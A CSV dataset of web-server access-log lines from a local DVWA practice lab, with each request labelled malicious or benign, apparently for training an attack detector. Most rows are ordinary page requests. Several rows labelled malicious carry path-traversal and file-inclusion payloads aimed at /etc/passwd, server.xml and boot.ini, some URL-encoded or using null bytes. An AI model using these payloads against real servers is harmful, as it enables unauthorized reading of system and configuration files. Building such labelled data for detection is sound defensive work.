,url,malicious
149,"127.0.0.1 - - [28/Apr/2021:22:50:49 -0400] ""GET /DVWA/vulnerabilities/upload/ HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
173,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 302 512 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
22,"127.0.0.1 - - [28/Apr/2021:22:12:26 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/about.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
78,"127.0.0.1 - - [28/Apr/2021:22:51:02 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=3&Submit=Submit HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
55,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
80,"127.0.0.1 - - [28/Apr/2021:22:31:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2fetc%2fpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
153,"127.0.0.1 - - [28/Apr/2021:22:49:55 -0400] ""GET /DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=haha&password=abc&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
233,"127.0.0.1 - - [28/Apr/2021:22:31:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2ewinnt%2fdesktop%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
155,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
135,"127.0.0.1 - - [28/Apr/2021:22:51:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=hello HTTP/1.1"" 200 1659 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
187,"127.0.0.1 - - [28/Apr/2021:22:31:48 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fconf%2fserver%2exml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
81,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 304 180 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
96,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
179,"127.0.0.1 - - [28/Apr/2021:21:53:23 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2135 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
95,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /DVWA/index.php HTTP/1.1"" 200 2877 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
65,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 304 180 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11,"127.0.0.1 - - [28/Apr/2021:22:31:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e% 25%5c%2e%2e%25%5c%2e%2e%255cboot%2eini"" 400 0 ""-"" ""-""",1
77,"127.0.0.1 - - [28/Apr/2021:22:51:20 -0400] ""GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1"" 200 1870 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=alan"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
221,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/vulnerabilities/csrf/ HTTP/1.1"" 200 1919 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
104,"127.0.0.1 - - [28/Apr/2021:22:50:57 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1"" 200 1662 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
83,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1446 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
76,"127.0.0.1 - - [28/Apr/2021:22:51:42 -0400] ""GET /DVWA/vulnerabilities/javascript/ HTTP/1.1"" 200 3513 ""http://127.0.0.1/DVWA/vulnerabilities/xss_s/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/favicon.ico HTTP/1.1"" 200 1706 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
39,"127.0.0.1 - - [28/Apr/2021:22:11:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
